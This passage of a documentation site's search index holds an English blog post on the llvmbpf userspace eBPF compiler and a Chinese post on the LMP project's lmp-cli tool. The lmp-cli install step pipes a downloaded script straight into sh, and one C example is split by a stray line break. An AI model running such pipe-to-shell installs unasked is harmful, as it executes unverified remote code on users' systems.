LLVM IR, providing more flexibility and control over the compilation process.</p> </li> <li> <p>Standalone Deployment: With llvmbpf, you can build eBPF programs into standalone binaries that don\u2019t require external dependencies. This feature is particularly useful for deploying eBPF programs on embedded systems, microcontrollers, or other environments where installing additional software is impractical. Compared to native C code development, this ensures the eBPF part is verified after integration with the verifier.</p> </li> <li> <p>All-Architecture Support: llvmbpf is designed to be compatible across multiple architectures, making it versatile for a wide range of hardware platforms.</p> </li> <li> <p>Maps and Relocation Support: Unlike many other userspace eBPF solutions, llvmbpf provides robust support for maps, data relocation, and <code>lddw</code> helper functions, allowing for the creation of more complex and powerful eBPF programs.</p> </li> <li> <p>Extensible Optimization Approaches: Leveraging LLVM\u2019s powerful optimization capabilities, llvmbpf allows for advanced optimizations such as inlining maps and helper functions, as well as using original LLVM IR for enhanced performance. </p> </li> </ol> <p>In this blog, we\u2019ll walk through some practical examples of how to use llvmbpf, highlighting its core features and capabilities.</p> <p>For a comprehensive userspace eBPF runtime that includes support for maps, helpers, and seamless execution of Uprobe, syscall trace, XDP, and other eBPF programs\u2014similar to kernel functionality but in userspace\u2014please refer to the bpftime project.</p>"},{"location":"blogs/llvmbpf/#getting-started-with-llvmbpf","title":"Getting Started with llvmbpf","text":""},{"location":"blogs/llvmbpf/#using-llvmbpf-as-a-library","title":"Using llvmbpf as a Library","text":"<p>llvmbpf can be used as a library within your application to load and execute eBPF programs. Here\u2019s a basic example:</p> <pre><code>void run_ebpf_prog(const void *code, size_t code_len) {\n    uint64_t res = 0;\n    llvmbpf_vm vm;\n\n    res = vm.load_code(code, code_len);\n    if (res) {\n        return;\n    }\n    vm.register_external_function(2, \"print\", (void *)ffi_print_func);\n    auto func = vm.compile();\n    if (!func) {\n        return;\n    }\n    int err = vm.exec(&amp;bpf_mem, sizeof(bpf_mem), res);\n    if (err != 0) {\n        return;\n    }\n    printf(\"res = %\" PRIu64 \"\\n\", res);\n}\n</code></pre> <p>This snippet shows how you can load eBPF bytecode, register external functions, and execute the program within the VM.</p>"},{"location":"blogs/llvmbpf/#using-llvmbpf-as-an-aot-compiler","title":"Using llvmbpf as an AOT Compiler","text":"<p>One of the most powerful features of llvmbpf is its ability to function as an AOT compiler, converting eBPF bytecode into native ELF object files. This approach not only boosts performance but also simplifies the deployment of eBPF programs.</p> <p>You can use the CLI to generate LLVM IR from eBPF bytecode:</p> <pre><code># ./build/cli/bpftime-vm build .github/assets/sum.bpf.o -emit-llvm &gt; test.bpf.ll\n# opt -O3 -S test.bpf.ll -opaque-pointers -o test.opt.ll\n# cat test.opt.ll\n</code></pre> <p>AOT Compile an eBPF program:</p> <pre><code># ./build/cli/bpftime-vm build .github/assets/sum.bpf.o\n[info] Processing program test\n[info] Program test written to ./test.o\n</code></pre> <p>Load and run an AOT-compiled eBPF program:</p> <pre><code># echo \"AwAAAAEAAAACAAAAAwAAAA==\" | base64 -d &gt; test.bin\n# ./build/cli/bpftime-vm run test.o test.bin\n[info] LLVM-JIT: Loading aot object\n[info] Program executed successfully. Return value: 6\n</code></pre> <p>The resulting ELF object file can be linked with other object files or loaded directly into the llvmbpf runtime, making it highly versatile for different use cases.</p>"},{"location":"blogs/llvmbpf/#loading-ebpf-bytecode-from-elf-files","title":"Loading eBPF Bytecode from ELF Files","text":"<p>llvmbpf supports loading eBPF bytecode directly from ELF files, which is a common format for storing compiled eBPF programs. This feature is particularly useful when working with existing eBPF toolchains.</p> <pre><code>bpf_object *obj = bpf_object__open(ebpf_elf.c_str());\nif (!obj) {\n    return 1;\n}\nstd::unique_ptr&lt;bpf_object, decltype(&amp;bpf_object__close)&gt; elf(\n    obj, bpf_object__close);\n\nbpf_program *prog;\nfor ((prog) = bpf_object__next_program((elf.get()), nullptr);\n     (prog) != nullptr;\n     (prog) = bpf_object__next_program((elf.get()), (prog))) {\n    llvmbpf_vm vm;\n    vm.load_code((const void *)bpf_program__insns(prog),\n                 (uint32_t)bpf_program__insn_cnt(prog) * 8);\n}\n</code></pre> <p>However, the <code>bpf.o</code> ELF file has no map and data relocation support. We recommend using bpftime to load and relocate the eBPF bytecode from an ELF file. This includes:</p> <ul> <li>Writing a loader similar to the kernel eBPF loader to load the eBPF bytecode (see an example here).</li> <li>Using libbpf, which supports:</li> <li>Relocation for maps, where the map ID is allocated by the loader and bpftime. You can use the map ID to access maps through the helpers.</li> <li>Accessing data through the <code>lddw</code> helper function.</li> <li>After loading the eBPF bytecode and completing relocation, you can use the bpftimetool to dump the map information and eBPF bytecode.</li> </ul>"},{"location":"blogs/llvmbpf/#maps-and-data-relocation-support","title":"Maps and Data Relocation Support","text":"<p>llvmbpf offers extensive support for maps and data relocation, allowing developers to write more complex eBPF programs that interact with different data sources. For instance, you can use helper functions to access maps or define maps as global variables in your eBPF programs.</p> <p>The eBPF can work with maps in two ways:</p> <ul> <li>Using helper functions to access the maps, like <code>bpf_map_lookup_elem</code>, <code>bpf_map_update_elem</code>, etc.</li> <li>Using maps as global variables in the eBPF program and accessing the maps directly.</li> </ul> <pre><code>uint32_t ctl_array[2] = { 0, 0 };\nuint64_t cntrs_array[2] = { 0, 0 };\n\nvoid *bpf_map_lookup_elem(uint64_t map_fd, void *key) {\n    if (map_fd == 5) {\n        return &amp;ctl_array[*(uint32_t *)key];\n    } else if (map_fd == 6) {\n        return &amp;cntrs_array[*(uint32_t *)key];\n    } else {\n        return nullptr;\n    }\n}\n</code></pre>"},{"location":"blogs/llvmbpf/#building-into-standalone-binary-for-deployment","title":"Building into Standalone Binary for Deployment","text":"<p>One of the standout features of llvmbpf is the ability to compile eBPF programs into standalone binaries. This makes it possible to deploy eBPF applications in environments where installing dependencies is not feasible, such as microcontrollers or other embedded systems.</p> <p>You can build the eBPF program into a standalone binary that does not rely on any external libraries and can be executed like normal C code with helper and map support.</p> <p>This approach offers several benefits:</p> <ul> <li>Easily deploy the eBPF program to any machine without needing to install dependencies.</li> <li>Avoid the overhead of loading the eBPF bytecode and maps at runtime.</li> <li>Make it suitable for microcontrollers or embedded systems that do not have an OS.</li> </ul> <p>Here\u2019s a basic example:</p> <pre><code>#include &lt;stdint.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;inttypes.h&gt;\n\nint bpf_main(void* ctx, uint64_t size);\n\nuint32_t ctl_array[2] = { 0, 0 };\nuint64_t cntrs_array[2] = { 0, 0 };\n\nvoid *_bpf_helper_ext_0001(uint64_t map_fd, void *key) {\n  printf(\"bpf_map_lookup_elem %lu\\n\", map_fd);\n  if (map_fd == 5) {\n    return &amp;ctl_array[*(uint32_t *)key];\n  } else if (map\n\n_fd == 6) {\n    return &amp;cntrs_array[*(uint32_t *)key];\n  } else {\n    return NULL;\n  }\n}\n\nvoid* __lddw_helper_map_val(uint64_t val) {\n    printf(\"map_val %lu\\n\", val);\n    if (val == 5) {\n        return (void *)ctl_array;\n    } else if (val == 6) {\n        return (void *)cntrs_array;\n    } else {\n        return NULL;\n    }\n}\n\nuint8_t bpf_mem[] = { 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88 };\n\nint main() {\n    printf(\"The value of cntrs_array[0] is %\" PRIu64 \"\\n\", cntrs_array[0]);\n    printf(\"calling ebpf program...\\n\");\n    bpf_main(bpf_mem, sizeof(bpf_mem));\n    printf(\"The value of cntrs_array[0] is %\" PRIu64 \"\\n\", cntrs_array[0]);\n    return 0;\n}\n</code></pre> <p>Compile the C code with the LLVM IR:</p> <pre><code>clang -g main.c xdp-counter.ll -o standalone \n</code></pre> <p>You can then run the <code>standalone</code> eBPF program directly. Compared to native C code development, this ensures that the eBPF part is verified after integration with the verifier.</p>"},{"location":"blogs/llvmbpf/#optimization-techniques","title":"Optimization Techniques","text":"<p>llvmbpf provides several optimization techniques to enhance the performance of eBPF programs. Two notable methods include:</p>"},{"location":"blogs/llvmbpf/#inlining-maps-and-helper-functions","title":"Inlining Maps and Helper Functions","text":"<p>By inlining maps and helper functions, llvmbpf reduces the overhead of function calls, enabling more efficient execution of eBPF programs.</p> <pre><code>clang -S -O3 -emit-llvm libmap.c -o libmap.ll\nllvm-link -S -o xdp-counter-inline.ll xdp-counter.ll libmap.ll\nopt --always-inline -S xdp-counter-inline.ll -o xdp-counter-inline.ll\n</code></pre>"},{"location":"blogs/llvmbpf/#using-original-llvm-ir-from-c-code","title":"Using Original LLVM IR from C Code","text":"<p>Instead of relying solely on eBPF instructions, llvmbpf allows developers to use original LLVM IR generated from C code. This flexibility opens the door for more advanced optimizations and higher performance.</p> <pre><code>int bpf_main(void* ctx, int size) {\n    _bpf_helper_ext_0006(\"hello world: %d\\n\", size);\n    return 0;\n}\n</code></pre> <p>eBPF is an instruction set designed for verification, but it may not be the best for performance. llvmbpf also supports using the original LLVM IR from C code. See example/load-llvm-ir for an example. You can:</p> <ul> <li>Compile the C code to eBPF for verification.</li> <li>Compile the C code to LLVM IR and native code for execution in the VM.</li> </ul>"},{"location":"blogs/llvmbpf/#conclusion","title":"Conclusion","text":"<p>llvmbpf is a powerful tool for developers looking to leverage eBPF outside the kernel. With features like AOT compilation, standalone deployment, and extensive support for maps and relocation, it offers a flexible and high-performance solution for a wide range of use cases. Whether you\u2019re working on networking, security, or performance monitoring applications, llvmbpf provides the tools you need to build efficient and portable eBPF programs.</p>"},{"location":"blogs/llvmbpf/#links","title":"Links","text":"<ul> <li>llvmbpf</li> <li>bpftime</li> <li>LLVM BPF Examples</li> <li>eBPF ISA</li> </ul> <p>Share on  Share on </p>"},{"location":"blogs/lmp-eunomia/","title":"\u5982\u4f55\u5728 Linux \u663e\u5fae\u955c\uff08LMP\uff09\u9879\u76ee\u4e2d\u5f00\u542f eBPF \u4e4b\u65c5\uff1f","text":"<p>eBPF \u4e3a Linux \u5185\u6838\u63d0\u4f9b\u4e86\u53ef\u6269\u5c55\u6027\uff0c\u4f7f\u5f00\u53d1\u4eba\u5458\u80fd\u591f\u5bf9 Linux \u5185\u6838\u8fdb\u884c\u7f16\u7a0b\uff0c\u4ee5\u4fbf\u6839\u636e\u4ed6\u4eec\u7684\u4e1a\u52a1\u9700\u6c42\u5feb\u901f\u6784\u5efa\u667a\u80fd\u7684\u6216\u4e30\u5bcc\u7684\u529f\u80fd\u3002</p> <p>\u6211\u4eec\u7684 LMP(Linux Microscope) \u9879\u76ee \u662f\u4e3a\u4e86\u5145\u5206\u6316\u6398 ebpf \u7684\u53ef\u80fd\u6027\u800c\u5efa\u7acb\u7684\uff0c\u9879\u76ee\u4ee5\u6784\u5efa eBPF \u5b66\u4e60\u793e\u533a\u3001\u6210\u4e3a eBPF \u5de5\u5177\u96c6\u6563\u5730\u3001\u5b75\u5316 eBPF \u60f3\u6cd5\u548c\u9879\u76ee\u4e3a\u76ee\u6807\uff0c\u6b63\u5728\u5927\u529b\u5efa\u8bbe\u4e2d\u3002\u4e4b\u524d\u6211\u4eec\u5728 LMP \u5176\u4e2d\u7684 eBPF Supermarket \u4e2d\u5305\u542b\u4e86\u5927\u91cf\u7531\u4e2a\u4eba\u5f00\u53d1\u8005\u7f16\u5199\u7684 eBPF \u5de5\u5177\uff0c\u8986\u76d6\u4e86\u7f51\u7edc\u3001\u6027\u80fd\u5206\u6790\u3001\u5b89\u5168\u7b49\u591a\u79cd\u529f\u80fd\uff0c\u6211\u4eec\u6b63\u5728\u5c1d\u8bd5\u628a\u5176\u4e2d\u7684\u4e00\u4e9b\u7a0b\u5e8f\u8fc1\u79fb\u5230 eBPF Hub\uff0c\u4e00\u4e9b\u89c4\u8303\u5316\u7684 eBPF \u7a0b\u5e8f\u5e93\uff0c\u53ef\u4ee5\u968f\u65f6\u4e0b\u8f7d\u8fd0\u884c\uff0c\u6216\u5d4c\u5165\u5927\u578b\u5e94\u7528\u7a0b\u5e8f\u4e2d\u4f5c\u4e3a\u63d2\u4ef6\u4f7f\u7528\u3002</p> <p>\u6211\u4eec\u5c1d\u8bd5\u5728 eBPF Hub \u4e2d\uff0c\u57fa\u4e8e eunomia-bpf \u5f00\u53d1\u6846\u67b6\u521b\u5efa\u7b26\u5408 OCI \u6807\u51c6\u7684 Wasm \u548c eBPF \u7a0b\u5e8f\uff0c\u5e76\u5229\u7528 ORAS \u7b80\u5316\u6269\u5c55 LMP \u7684 eBPF \u5206\u53d1\u3001\u52a0\u8f7d\u3001\u8fd0\u884c\u80fd\u529b\u3002</p>"},{"location":"blogs/lmp-eunomia/#_1","title":"\u5feb\u901f\u4f7f\u7528","text":"<p>\u5982\u679c\u60a8\u60f3\u5feb\u901f\u5f00\u59cb eBPF\uff0c\u53ef\u4ee5\u4f7f\u7528\u6211\u4eec\u5f00\u53d1\u7684\u8f7b\u91cf\u7ea7\u6846\u67b6\u4e4b\u4e0a\u7684\u547d\u4ee4\u884c\u7a0b\u5e8f lmp-cli\u3002\u5f53\u4f7f\u7528\u811a\u672c\u5b89\u88c5\u597d\u6211\u4eec\u7684\u6846\u67b6\u4e4b\u540e\uff0c\u60a8\u53ea\u9700\u8981\u4e00\u6761\u547d\u4ee4\uff0c\u65e0\u9700\u4efb\u4f55\u7f16\u8bd1\uff0c\u5373\u53ef\u4f53\u4f1a\u5230 eBPF \u7684\u5f3a\u5927\u4e4b\u5904\uff1a</p> <pre><code>$ lmp run sigsnoop\ndownload with curl: https://linuxkerneltravel.github.io/lmp/sigsnoop/package.json\nrunning and waiting for the eBPF events from perf event...\ntime pid tpid sig ret comm\n00:21:41 109955 112863 28 0 gnome-terminal-\n00:21:41 109955 112862 28 0 gnome-terminal-\n...\n</code></pre> <p>\u5982\u679c\u60a8\u4f7f\u7528\u8fc7 bcc \u7b49 eBPF \u5f00\u53d1\u5de5\u5177\uff0c\u60a8\u4e00\u5b9a\u4f1a\u60ca\u559c\u4e8e LMP \u7684\u4fbf\u6377\u6027\u3002LMP \u4e2d\u5305\u542b\u4e86\u5404\u79cd\u5404\u6837\u7684 eBPF \u7a0b\u5e8f\uff0c\u8fd9\u79cd\u4fbf\u6377\u7684\u8fd0\u884c\uff0c\u79bb\u4e0d\u5f00\u6211\u4eec\u57fa\u4e8e\u7684\u5e95\u5c42\u6846\u67b6 eunomia-bpf\uff0c\u5b83\u5b8c\u5168\u5b9e\u73b0\u4e86\u201c\u4e00\u6b21\u7f16\u8bd1\uff0c\u5904\u5904\u8fd0\u884c\u201d\u7684 eBPF \u8de8\u5e73\u53f0\u76ee\u6807\u3002\u5728 eunomia-bpf \u6846\u67b6\u4e0b\uff0cLMP \u5f00\u53d1\u7684 eBPF \u5e94\u7528\u4e0d\u4ec5\u53ef\u4ee5\u9002\u914d\u4efb\u610f\u67b6\u6784\u548c\u4e0d\u540c\u5185\u6838\u7248\u672c\uff0c\u800c\u4e14\u8fd8\u5177\u6709\u8f7b\u91cf\u7ea7\u3001\u826f\u597d\u7684\u9694\u79bb\u6027\u7b49\u4f18\u70b9\uff0c\u53ef\u4ee5\u4f5c\u4e3a\u63d2\u4ef6\u5230\u5d4c\u5165\u5927\u578b\u5e94\u7528\u4e4b\u4e2d\u3002</p>"},{"location":"blogs/lmp-eunomia/#eunomia-bpf-ebpf-wasm","title":"eunomia-bpf\uff1a\u7ed3\u5408 eBPF \u548c Wasm \u7684\u8f7b\u91cf\u7ea7\u5f00\u53d1\u6846\u67b6","text":"<p>\u4f5c\u4e3a\u4e00\u4e2a eBPF \u7a0b\u5e8f\u7684\u8f7b\u91cf\u7ea7\u5f00\u53d1\u52a0\u8f7d\u6846\u67b6\uff0ceunomia-bpf \u57fa\u4e8e Wasm \u8fd0\u884c\u65f6\u548c BTF \u6280\u672f\uff0c\u5305\u542b\u4e86\u4e00\u4e2a\u7528\u6237\u6001\u52a8\u6001\u52a0\u8f7d\u6846\u67b6/\u8fd0\u884c\u65f6\u5e93\uff0c\u4ee5\u53ca\u4e00\u4e2a\u7b80\u5355\u7684\u7f16\u8bd1 Wasm \u548c eBPF \u5b57\u8282\u7801\u7684\u5de5\u5177\u94fe\u5bb9\u5668\u3002</p> <p>Wasm \u662f\u4e3a\u4e86\u4e00\u4e2a\u53ef\u79fb\u690d\u7684\u76ee\u6807\u800c\u8bbe\u8ba1\u7684\uff0c\u53ef\u4f5c\u4e3a C/C+/RUST \u7b49\u9ad8\u7ea7\u8bed\u8a00\u7684\u7f16\u8bd1\u76ee\u6807\uff0c\u4f7f\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u5e94\u7528\u7a0b\u5e8f\u80fd\u591f\u5728 Web \u4e0a\u90e8\u7f72\u3002\u76ee\u524d\u5df2\u7ecf\u53d1\u5c55\u6210\u4e3a\u4e00\u4e2a\u8f7b\u91cf\u7ea7\u3001\u9ad8\u6027\u80fd\u3001\u8de8\u5e73\u53f0\u548c\u591a\u8bed\u79cd\u7684\u8f6f\u4ef6\u6c99\u76d2\u73af\u5883\uff0c\u88ab\u8fd0\u7528\u4e8e\u4e91\u539f\u751f\u8f6f\u4ef6\u7ec4\u4ef6\u3002 eunomia-bpf \u5c06 eBPF \u7528\u6237\u6001\u7684\u6240\u6709\u63a7\u5236\u548c\u6570\u636e\u5904\u7406\u903b\u8f91\u5168\u90e8\u79fb\u5230 Wasm \u865a\u62df\u673a\u4e2d\uff0c\u901a\u8fc7 Wasm module \u6253\u5305\u548c\u5206\u53d1 eBPF \u5b57\u8282\u7801\uff0c\u540c\u65f6\u5728 Wasm \u865a\u62df\u673a\u5185\u90e8\u63a7\u5236\u6574\u4e2a eBPF \u7a0b\u5e8f\u7684\u52a0\u8f7d\u548c\u6267\u884c\uff0c\u5c06\u4e8c\u8005\u7684\u4f18\u52bf\u7ed3\u5408\u4e86\u8d77\u6765\u3002</p> <p>\u5728 Wasm \u6a21\u5757\u4e2d\u7f16\u5199 eBPF \u4ee3\u7801\u548c\u901a\u5e38\u719f\u6089\u7684\u4f7f\u7528 libbpf \u6846\u67b6\u6216 Coolbpf \u5f00\u53d1 eBPF \u7a0b\u5e8f\u7684\u65b9\u5f0f\u662f\u57fa\u672c\u4e00\u6837\u7684\uff0cWasm \u7684\u590d\u6742\u6027\u4f1a\u88ab\u9690\u85cf\u5728 eunomia-bpf \u7684\u7f16\u8bd1\u5de5\u5177\u94fe\u548c\u8fd0\u884c\u65f6\u5e93\u4e2d\uff0c\u5f00\u53d1\u8005\u53ef\u4ee5\u4e13\u6ce8\u4e8e eBPF \u7a0b\u5e8f\u7684\u5f00\u53d1\u548c\u8c03\u8bd5\uff0c\u4e0d\u9700\u8981\u4e86\u89e3 Wasm \u7684\u80cc\u666f\u77e5\u8bc6\uff0c\u4e5f\u4e0d\u9700\u8981\u62c5\u5fc3 Wasm \u7684\u7f16\u8bd1\u73af\u5883\u914d\u7f6e\u3002</p> <p>\u5927\u81f4\u6765\u8bf4\uff0ceunomia-bpf \u5728 Wasm \u8fd0\u884c\u65f6\u548c\u7528\u6237\u6001\u7684 libbpf \u4e2d\u95f4\u591a\u52a0\u4e86\u4e00\u5c42\u62bd\u8c61\u5c42\uff0c\u4f7f\u5f97\u4e00\u6b21\u7f16\u8bd1\u3001\u5230\u5904\u8fd0\u884c\u7684 eBPF \u4ee3\u7801\u53ef\u4ee5\u4ece JSON \u5bf9\u8c61\u4e2d\u52a8\u6001\u52a0\u8f7d\u3002JSON \u5bf9\u8c61\u4f1a\u5728\u7f16\u8bd1\u65f6\u88ab\u5305\u542b\u5728 Wasm \u6a21\u5757\u4e2d\uff0c\u56e0\u6b64\u5728\u8fd0\u884c\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u89e3\u6790 JSON \u5bf9\u8c61\u6765\u83b7\u53d6 eBPF \u7a0b\u5e8f\u7684\u4fe1\u606f\uff0c\u7136\u540e\u52a8\u6001\u52a0\u8f7d eBPF \u7a0b\u5e8f\u3002\u901a\u8fc7 Wasm module \u6253\u5305\u548c\u5206\u53d1 eBPF \u5b57\u8282\u7801\uff0c\u540c\u65f6\u5728 Wasm \u865a\u62df\u673a\u5185\u90e8\u63a7\u5236\u6574\u4e2a eBPF \u7a0b\u5e8f\u7684\u52a0\u8f7d\u548c\u6267\u884c\uff0ceunomia-bpf \u5c31\u53ef\u4ee5\u5c06\u4e8c\u8005\u7684\u4f18\u52bf\u7ed3\u5408\u8d77\u6765\uff0c\u8ba9\u4efb\u610f eBPF \u7a0b\u5e8f\u80fd\u6709\u5982\u4e0b\u7279\u6027\uff1a</p> <ul> <li>\u53ef\u79fb\u690d\uff1a\u8ba9 eBPF \u5de5\u5177\u548c\u5e94\u7528\u4e0d\u9700\u8981\u8fdb\u884c\u91cd\u65b0\u7f16\u8bd1\u5373\u53ef\u4ee5\u8de8\u5e73\u53f0\u5206\u53d1\uff0c\u7701\u53bb\u4e86\u590d\u6742\u7684\u4ea4\u53c9\u7f16\u8bd1\u6d41\u7a0b\uff1b</li> <li>\u9694\u79bb\u6027\uff1a\u8ba9 eBPF \u7a0b\u5e8f\u7684\u52a0\u8f7d\u548c\u6267\u884c\u3001\u4ee5\u53ca\u7528\u6237\u6001\u7684\u6570\u636e\u5904\u7406\u6d41\u7a0b\u66f4\u52a0\u5b89\u5168\u53ef\u9760\u3002</li> <li>\u5305\u7ba1\u7406\uff1a\u5b8c\u6210 eBPF \u7a0b\u5e8f\u6216\u5de5\u5177\u7684\u5206\u53d1\u3001\u7ba1\u7406\u3001\u52a0\u8f7d\u7b49\u5de5\u4f5c\u3002</li> <li>\u654f\u6377\u6027\uff1a\u4f7f\u6bcf\u4e2a\u4eba\u90fd\u53ef\u4ee5\u4f7f\u7528\u5b98\u65b9\u548c\u672a\u7ecf\u4fee\u6539\u7684\u5e94\u7528\u7a0b\u5e8f\u6765\u52a0\u8f7d\u81ea\u5b9a\u4e49\u6269\u5c55\uff0c\u4efb\u4f55 eBPF \u7a0b\u5e8f\u7684\u9519\u8bef\u4fee\u590d\u548c/\u6216\u66f4\u65b0\u90fd\u53ef\u4ee5\u5728\u8fd0\u884c\u65f6\u63a8\u9001\u548c/\u6216\u6d4b\u8bd5\uff0c\u800c\u4e0d\u9700\u8981\u66f4\u65b0\u548c/\u6216\u91cd\u65b0\u90e8\u7f72\u4e00\u4e2a\u65b0\u7684\u4e8c\u8fdb\u5236\u3002</li> <li>\u8f7b\u91cf\u7ea7\uff1a\u4e0e Linux \u5bb9\u5668\u5e94\u7528\u76f8\u6bd4\uff0cWasm \u5fae\u670d\u52a1\u51b7\u542f\u52a8\u7684\u65f6\u95f4\u662f 1%\uff0c\u53ef\u4ee5\u5b9e\u73b0 eBPF as a service\uff0c\u8ba9 eBPF \u7a0b\u5e8f\u7684\u52a0\u8f7d\u548c\u6267\u884c\u53d8\u5f97\u66f4\u52a0\u8f7b\u91cf\u7ea7\u3001\u5feb\u901f\u3001\u7b80\u4fbf\u6613\u884c\u3002</li> </ul> <p>\u6211\u4eec\u5df2\u7ecf\u6d4b\u8bd5\u4e86\u5728 x86\u3001ARM \u7b49\u4e0d\u540c\u67b6\u6784\u4e0d\u540c\u5185\u6838\u7248\u672c\u7684 Linux \u7cfb\u7edf\u4e0a\uff0ceunomia-bpf \u6846\u67b6\u90fd\u53ef\u4ee5\u4f7f\u7528\u540c\u4e00\u4e2a\u9884\u7f16\u8bd1 eBPF \u7a0b\u5e8f\u4e8c\u8fdb\u5236\uff0c\u4ece\u4e91\u7aef\u4e00\u884c\u547d\u4ee4\u83b7\u53d6\u5230\u672c\u5730\u4e4b\u540e\u8fd0\u884c\u3002\u4e4b\u540e eunomia-bpf \u8fd8\u4f1a\u6dfb\u52a0 RISC-V \u7b49\u66f4\u591a\u67b6\u6784\u7684\u652f\u6301\u3002</p>"},{"location":"blogs/lmp-eunomia/#lmp-cli-ebpf","title":"\u4f7f\u7528 lmp-cli \u6784\u5efa\u4e00\u4e2a eBPF \u9879\u76ee","text":"<p>\u5982\u679c\u60a8\u662f\u4e00\u4e2a eBPF \u5de5\u5177\u7684\u4f7f\u7528\u8005\uff0c\u60a8\u53ef\u4ee5\u65e0\u9700\u4efb\u4f55\u7f16\u8bd1\u6d41\u7a0b\uff0c\u4e5f\u4e0d\u9700\u8981\u4e86\u89e3\u4efb\u4f55 eBPF \u548c Wasm \u7684\u76f8\u5173\u77e5\u8bc6\uff0c\u4f7f\u7528 <code>lmp run &lt;name&gt;</code> \u5c31\u53ef\u4ee5\u76f4\u63a5\u8fd0\u884c LMP \u4ed3\u5e93\u7684\u5c0f\u7a0b\u5e8f\uff0c\u5176\u4e2d\u4f1a\u8c03\u7528<code>lmp pull &lt;name&gt;</code>\u547d\u4ee4\u4ece\u4e91\u7aef\u4ece\u5e93\u4e2d\u4e0b\u8f7d\u5bf9\u5e94\u7684\u5c0f\u7a0b\u5e8f\u3002</p> <p>\u5982\u679c\u60a8\u662f\u4e00\u4e2a eBPF \u7a0b\u5e8f\u7684\u5f00\u53d1\u8005\uff0c\u8ba9\u6211\u4eec\u5f00\u59cb\u521b\u5efa\u3001\u7f16\u8bd1\u5e76\u8fd0\u884c\u4e00\u4e2a\u7b80\u5355\u7684\u7a0b\u5e8f\u3002\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u4f7f\u7528\u57fa\u7b80\u5355\u547d\u4ee4\u884c\u5de5\u5177 lmp-cli\uff0c\u6982\u8ff0\u5982\u4f55\u4ece\u56db\u4e2a\u6b65\u9aa4\u5f00\u59cb\u6784\u5efa\u3002</p>"},{"location":"blogs/lmp-eunomia/#1","title":"1. \u51c6\u5907\u4f60\u7684\u73af\u5883","text":"<p>eBPF \u672c\u8eab\u662f\u4e00\u79cd Linux \u5185\u6838\u6280\u672f\uff0c\u56e0\u6b64\u4efb\u4f55\u5b9e\u9645\u7684 BPF \u7a0b\u5e8f\u90fd\u5fc5\u987b\u5728 Linux \u5185\u6838\u4e2d\u8fd0\u884c\u3002\u6211\u5efa\u8bae\u60a8\u4ece\u5185\u6838 5.4 \u6216\u66f4\u65b0\u7684\u7248\u672c\u5f00\u59cb\u3002\u4ece SSH \u7ec8\u7aef\uff0c\u68c0\u67e5\u5185\u6838\u7248\u672c\uff0c\u5e76\u786e\u8ba4\u60a8\u5df2\u7ecf\u542f\u7528\u4e86 CONFIG_DEBUG_INFO_BTF\uff1a</p> <pre><code>uname -r\ncat /boot/config-$(uname -r) | grep CONFIG_DEBUG_INFO_BTF\n</code></pre> <p>\u4f60\u4f1a\u770b\u5230\u7c7b\u4f3c\u8fd9\u6837\u7684\u8f93\u51fa\uff1a</p> <pre><code>$ uname -r\n5.15.0-48-generic\n\n$ cat /boot/config-$(uname -r) | grep CONFIG_DEBUG_INFO_BTF\nCONFIG_DEBUG_INFO_BTF=y\nCONFIG_DEBUG_INFO_BTF_MODULES=y\n</code></pre> <p>\u5b89\u88c5\u547d\u4ee4\u884c\u5de5\u5177 lmp-cli\uff1a</p> <pre><code>curl https://github.com/GorilaMond/lmp_cli/releases/download/lmp/install.sh | sh\n</code></pre>"},{"location":"blogs/lmp-eunomia/#2","title":"2. \u521b\u5efa\u9879\u76ee\u7684\u5185\u6838\u90e8\u5206","text":"<p>\u4f7f\u7528<code>lmp init</code>\u521b\u5efa\u4e00\u4e2a\u9879\u76ee\u6a21\u677f\uff0c\u6765\u521d\u59cb\u5316\u4f60\u7684\u5185\u6838\u7a0b\u5e8f\uff0c\u5feb\u901f\u5730\u6295\u5165\u5230\u4ee3\u7801\u7684\u7f16\u5199\u4e2d\uff1a</p> <pre><code>lmp init hello\n</code></pre> <p>\u6210\u529f\u521b\u5efa\u9879\u76ee\u540e\uff0c\u60a8\u5c06\u770b\u5230\u5982\u4e0b\u7c7b\u4f3c\u7684\u8f93\u51fa\uff1a</p> <pre><code>$ lmp init hello\nCloning into 'ebpm-template'...\n</code></pre> <p>\u5b83\u5b9e\u9645\u4e0a\u521b\u5efa\u4e86\u4e00\u4e2a\u9879\u76ee\u540d\u5bf9\u5e94\u7684\u6587\u4ef6\u5939\uff0c\u91cc\u9762\u6709\u8fd9\u4e9b\u6587\u4ef6\uff1a</p> <pre><code>$ cd hello/\n$ ll\n...\n-rw-rw-r--  1 a a 2910 10\u6708 17 23:18 bootstrap.bpf.c\n-rw-rw-r--  1 a a  392 10\u6708 17 23:18 bootstrap.h\n-rw-rw-r--  1 a a  221 10\u6708 17 23:18 config.json\ndrwxrwxr-x  8 a a 4096 10\u6708 17 23:18 .git/\ndrwxrwxr-x  3 a a 4096 10\u6708 17 23:18 .github/\n-rw-rw-r--  1 a a   21 10\u6708 17 23:18 .gitignore\n-rw-rw-r--  1 a a 2400 10\u6708 17 23:18 README.md\n</code></pre> <p>\u5185\u6838\u7a0b\u5e8f\u6a21\u677f bootstrap.bpf.c \u4e2d\u9ed8\u8ba4\u7684\u8ddf\u8e2a\u70b9\u4e3a <code>tp/sched/sched_process_exec</code>\u548c<code>tp/sched/sched_process_exit</code>\uff0c\u7528\u6765\u8ddf\u8e2a\u65b0\u7a0b\u5e8f\u7684\u6267\u884c\u548c\u9000\u51fa\uff0c\u8fd9\u91cc\u4e0d\u505a\u4fee\u6539\u3002</p> <p>\u6784\u5efa\u5185\u6838\u9879\u76ee\uff0c\u5982\u4e0b\u6240\u793a\u3002\u4fdd\u5b58\u60a8\u7684\u66f4\u6539\uff0c\u4f7f\u7528 <code>sudo lmp build</code> \u6784\u5efa\u5185\u6838\u7a0b\u5e8f\uff0c\u8fd9\u4f1a\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a package.json \u7684\u5bf9\u8c61\u6587\u4ef6\u3002</p> <pre><code>$ sudo lmp build\nmake\n  ...\n  BINARY   client\n  DUMP_LLVM_MEMORY_LAYOUT\n  DUMP_EBPF_PROGRAM\n  FIX_TYPE_INFO_IN_EBPF\n  GENERATE_PACKAGE_JSON\n</code></pre>"},{"location":"blogs/lmp-eunomia/#3","title":"3. 